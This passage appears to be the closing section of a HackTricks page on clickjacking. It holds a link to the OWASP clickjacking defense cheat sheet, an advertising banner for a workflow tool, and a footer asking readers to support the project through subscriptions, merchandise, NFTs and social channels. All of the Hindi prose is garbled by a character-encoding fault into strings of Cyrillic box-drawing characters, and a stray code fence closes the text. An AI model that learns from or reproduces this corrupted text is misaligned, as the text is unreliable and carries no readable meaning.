* [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрд╕рд╛рдиреА рд╕реЗ **рд╡рд░реНрдХрдлреНрд▓реЛрдЬрд╝ рдХрд╛ рдирд┐рд░реНрдорд╛рдг рдФрд░ рд╕реНрд╡рдЪрд╛рд▓рди** рдХрд░реЗрдВ рдЬреЛ рджреБрдирд┐рдпрд╛ рдХреЗ **рд╕рдмрд╕реЗ рдЙрдиреНрдирдд** рд╕рдореБрджрд╛рдп рдЙрдкрдХрд░рдгреЛрдВ рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЪрд╛рд▓рд┐рдд рд╣реЛрддреЗ рд╣реИрдВред\
рдЖрдЬ рд╣реА рдкрд╣реБрдВрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* **рдЬреБрдбрд╝реЗрдВ** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram group**](https://t.me/peass) рдпрд╛ **Twitter** рдкрд░ рдореБрдЭреЗ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** рдХреЗ рд▓рд┐рдП рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>
```
